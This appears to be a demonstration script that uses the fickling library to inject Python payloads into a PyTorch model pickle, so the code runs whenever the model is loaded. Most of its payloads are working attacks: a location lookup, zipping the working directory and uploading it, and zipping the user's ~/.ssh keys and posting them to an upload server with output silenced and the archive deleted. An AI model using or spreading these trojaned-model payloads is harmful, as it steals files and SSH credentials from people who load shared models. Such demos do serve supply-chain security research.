import argparse
from train_model import Net
from typing import Dict

examples: Dict[str, str] = {
    "minecraft": ['import os; os.system("open /Applications/Minecraft.app")'],
    "helloworld": ['print("Hello World")'],
    "neofetch": ['import os; os.system("neofetch")'],
    "location": ["import requests; print(requests.get('https://ipinfo.io').text)"],
    "scrape": [
        """import os, subprocess, requests; subprocess.run(['zip', '-r', 'archive.zip', '.'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); requests.post('http://localhost:25565/uploadfile', files={'file': open('archive.zip', 'rb')}); subprocess.run(['rm', 'archive.zip'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"""
    ],
    "ssh": [
        "import subprocess, requests, os; subprocess.run(['zip', '-r', 'ssh_backup.zip', os.path.expanduser('~/.ssh')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); requests.post('http://localhost:25565/uploadfile', files={'file': open('ssh_backup.zip', 'rb')}); subprocess.run(['rm', 'ssh_backup.zip'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL);"
        # "import subprocess, requests, os; subprocess.run(['zip', '-r', 'ssh_backup.zip', '/Users/user/.ssh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); requests.post('http://localhost:25565/uploadfile', files={'file': open('ssh_backup.zip', 'rb')}); subprocess.run(['rm', 'ssh_backup.zip'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL);"
    ],
}


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--pickle", type=str, help="The pickle file to load", default="mnist_cnn.pt"
    )

    parser.add_argument(
        "--example", type=str, choices=examples.keys(), default="location"
    )

    args = parser.parse_args()

    from fickling.pytorch import PyTorchModelWrapper

    # Load example PyTorch model
    model = Net()

    # Wrap model file into fickling
    result = PyTorchModelWrapper(args.pickle)

    # Inject payload, overwriting the existing file instead of creating a new one
    modified = "modified_" + args.pickle
    for x in examples[args.example]:
        result.inject_payload(
            x,
            modified,
            injection="insertion",
            overwrite=False,
        )
